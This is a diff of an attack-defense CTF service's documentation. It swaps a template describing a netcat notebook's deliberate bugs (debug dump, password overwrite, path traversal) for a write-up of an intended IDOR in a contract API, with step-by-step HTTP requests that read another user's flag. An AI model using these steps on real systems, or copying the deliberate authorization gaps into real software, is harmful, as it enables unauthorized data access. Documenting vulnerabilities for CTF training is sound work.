@@ -1,166 +1,114 @@
-Service documentation
-======================
-This is the place to keep important documentation details about your service.
+# Service documentation
 
-# Vulnerabilities
+This is the place to keep important documentation details about the service.
 
-Please keep track of your intended vulnerabilities here:
+SignMeMaybe stores CTF flags as the text content of contracts created by the checker. Every contract receives a public `reference` such as `CNTR-...`; internal numeric IDs are not exposed by the API.
 
-## Debug enabled
+## Contract Reference IDOR
 
-- Category: Misconfiguration
-- Difficulty: Easy
+The main branch intentionally exposes an Insecure Direct Object Reference (IDOR) in the contract retrieval endpoints. Authentication is required, but latest contract retrieval does not enforce contract ownership once a caller knows a public contract reference.
 
-When `self.debug` is set to `True`, the `dump` command will list all users and their notes. 
+*   **Public Metadata:** `GET /api/users/{username}/contracts` returns public contract metadata for a holder username, including contract references.
+*   **Latest Version Retrieval:** `GET /api/contracts/{reference}/versions/latest` requires a valid session token, but does not require the authenticated user to own the requested contract.
+*   **PDF Retrieval:** `GET /api/contracts/{reference}/versions/latest/pdf` mirrors the same authorization gap before returning a generated PDF.
+*   **Non-owner Behavior:** Requests for another user's contract return `200 OK` when the reference exists and the caller has any valid session. Missing references still return `404 Not Found`.
 
-## Account Takeover
+## Flags:
 
-- Category: Authentication
-- Difficulty: Medium
+*   **Contract Content:** The checker stores flags in the `content` field of a contract created during `putflag`.
+*   **Attack Hint:** `putflag` returns the owner username as the attack hint and keeps the owner's credentials plus contract reference in checker state for `getflag`.
+*   **Access Rule:** The flag remains retrievable by the owning checker account and is also retrievable by a different authenticated user who resolves the public contract reference.
 
-When registering a new user, the service does not check if the user already exists and simply overwrites the password (`self.users[reg_user] = reg_pw`). The list of existing users can be obtained with the `user` command.
+---
 
-## Arbitrary Read or Write (Account Takeover v2)
+## Exploitation Path
 
-- Category: Path traversal
-- Difficulty: Medium
+The intended exploit uses the checker-provided owner username to discover public contract references, then reads the latest contract version with an attacker-controlled session.
 
-The `FilesystemDict` uses user-supplied input when constructing the file paths. This could be used to write JSON-encoded data to any files. 
+### IDOR Check
 
-The impact has to be further analyzed. It at least leads to another account takeover (overwrite the password for other users, i.e. using `reg ../users/foo bar`).
+Register an attacker account:
 
-*Note:* Without a proper impact analysis, we would classify this issue as a `unintended` vulnerability. Please try to keep such issues to a minimum and document them nonetheless.
+```http
+POST /api/register HTTP/1.1
+Host: localhost:1984
+Content-Type: application/json
 
-# Exploits
-
-For each vulnerability, you should have a working example exploit ready! 
-
-## Debug enabled:
-
-Connect to the service and run `dump`:
-
-```
-gehaxelt@LagTop ~> nc 192.168.2.112 2323
-Welcome to the 1337 n0t3b00k!
-> dump
-Users:
-test:test
-foo:bar
-     Note 0:acbd18db4cc2f85cedef654fccc4a4d8:foo
-     Note 1:37b51d194a7513e45b56f6524f2d51f2:bar
-     Note 2:acbd18db4cc2f85cedef654fccc4a4d8:foo
-4FOBMO10HWLC:EDPWN79U2KNL
-I4K3P0SK3PST:CK5FALD39Y0S
-B70YKMW72KUR:79Y5IM7FD7O8
-GB7QC0DKYXPS:89TY8HI6OCBA
-NXPTITQUSN2M:WYIWSGRZNKTX
-6699DPYPAQDL:7IFEPP3P3LBI
-     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
-MPG81XWFHNE8:H8KP8VECBQOR
-     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
-QN973IXF53HT:9BUVY6JNMGIW
-     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
-UI2WTY7E7KC5:87SB830QHVX3
-     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
-XXPLIXZ9ZN1Q:F88L3J4GA2LE
-     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
-N43LU1348D19:YWT9TFCSVA2T
-     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
-3DP6COPE6GMX:OI9437MJORZR
-     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
-I8ZUNTWZ0Y0Q:B3AI1LN9SAAE
-     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
-JUACZ5J3D475:5RNZ1ETOFBS6
-     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
-KGFZNGHROLUS:05826L6X39XM
-     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
-FV9VM13K8MGF:POUIW5CM6PY2
-     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
-XAHOKR4QD63O:VENSD82XO1XM
-     Note 0:199480a3640248d5ea679b596d91c350:SKLNAYZAG7QX65RTMW3DCZAKPS9OC0TFH6GH
+{
+  "username": "attacker_user",
+  "password": "attacker_password"
+}
 ```
 
-The flags are in the output.
+The service returns a session token:
 
-## Account Takeover
-
-Connect to the service and use the `user` command to obtain a list of users:
-
-```
-gehaxelt@LagTop ~ [130]> nc 192.168.2.112 2323
-Welcome to the 1337 n0t3b00k!
-> user
-User 0: test
-User 1: foo
-User 2: 4FOBMO10HWLC
-User 3: I4K3P0SK3PST
-User 4: B70YKMW72KUR
-User 5: GB7QC0DKYXPS
-User 6: NXPTITQUSN2M
-User 7: 6699DPYPAQDL
-User 8: MPG81XWFHNE8
-User 9: QN973IXF53HT
-User 10: UI2WTY7E7KC5
-User 11: XXPLIXZ9ZN1Q
-User 12: N43LU1348D19
-User 13: 3DP6COPE6GMX
-User 14: I8ZUNTWZ0Y0Q
-User 15: JUACZ5J3D475
-User 16: KGFZNGHROLUS
-User 17: FV9VM13K8MGF
-User 18: XAHOKR4QD63O
+```json
+{
+  "userId": 2,
+  "username": "attacker_user",
+  "token": "<SESSION_TOKEN>"
+}
 ```
 
-Use the username(s) and the `reg` command to set a different password. Next, `log`in as the user, `list` their notes and obtain the flag:
+Use the target username from the attack hint to fetch public contract metadata:
 
-```
-> reg XAHOKR4QD63O foo
-User successfully registered
-> log XAHOKR4QD63O foo
-Successfully logged in!
-> list 
-Note 0: 199480a3640248d5ea679b596d91c350
-> get 199480a3640248d5ea679b596d91c350
-SKLNAYZAG7QX65RTMW3DCZAKPS9OC0TFH6GH
+```http
+GET /api/users/arden_ledger_12345/contracts HTTP/1.1
+Host: localhost:1984
+Accept: application/json
 ```
 
-## Arbitrary Read or Write (Account Takeover v2)
+The public metadata response includes contract references for that holder:
 
-Connect to the service and list all users:
-
-```
-gehaxelt@LagTop ~/C/A/e/service-example (cleanup)> nc 192.168.2.112 2323
-Welcome to the 1337 n0t3b00k!
-> users
-User 0: 0WTC89S0Y67Y
-User 1: HWG5RBYEQX3Y
-User 2: XK2UJAC7KWMB
-User 3: CF8TFV304DMO
-User 4: E9XAV2ACHRY0
-User 5: SHBSC21EC963
-User 6: AC1MSHQS7HE8
-User 7: OVTN3ZXRO7X0
-User 8: IM03X7OWDEV7
-User 9: NQST4C3ABWLD
-User 10: VS7ZY06LELHI
-User 11: WFS6JGH8DDYO
-User 12: WBAYX5MLDMIG
-User 13: H4YXGNP9D3GS
-User 14: S735UCC1O7FE
-User 15: foo
+```json
+{
+  "username": "arden_ledger_12345",
+  "contracts": [
+    {
+      "reference": "CNTR-0123456789abcdef01234567",
+      "title": "Signing Package example",
+      "latestVersion": {
+        "versionNumber": 1,
+        "approvalState": "draft"
+      }
+    }
+  ]
+}
 ```
 
-Use the username(s) and the `reg` command to set a new password by abusing the path traversal bug:
+Use the attacker token to fetch the latest version by reference:
 
+```http
+GET /api/contracts/CNTR-0123456789abcdef01234567/versions/latest HTTP/1.1
+Host: localhost:1984
+X-Session-Token: <SESSION_TOKEN>
+Accept: application/json
 ```
-gehaxelt@LagTop ~/C/A/e/service-example (cleanup)> nc 192.168.2.112 2323
-Welcome to the 1337 n0t3b00k!
-> reg ../users/foo bar
-User successfully registered
-> log foo bar
-Successfully logged in!
-> list
-Note 0: 581f1b0f439b22d1d2c617d1e8963505
-> get 581f1b0f439b22d1d2c617d1e8963505
-ENOTESTFLAG
+
+On `main`, this returns `200 OK` even when the contract belongs to another user:
+
+```json
+{
+  "reference": "CNTR-0123456789abcdef01234567",
+  "ownerUsername": "arden_ledger_12345",
+  "requestedByUsername": "attacker_user",
+  "content": "<FLAG>"
+}
+```
+
+The generated PDF endpoint follows the same IDOR:
+
+```http
+GET /api/contracts/CNTR-0123456789abcdef01234567/versions/latest/pdf HTTP/1.1
+Host: localhost:1984
+X-Session-Token: <SESSION_TOKEN>
+```
+
+The owner can still fetch the contract normally with their own token:
+
+```http
+GET /api/contracts/CNTR-0123456789abcdef01234567/versions/latest HTTP/1.1
+Host: localhost:1984
+X-Session-Token: <OWNER_SESSION_TOKEN>
+Accept: application/json
 ```
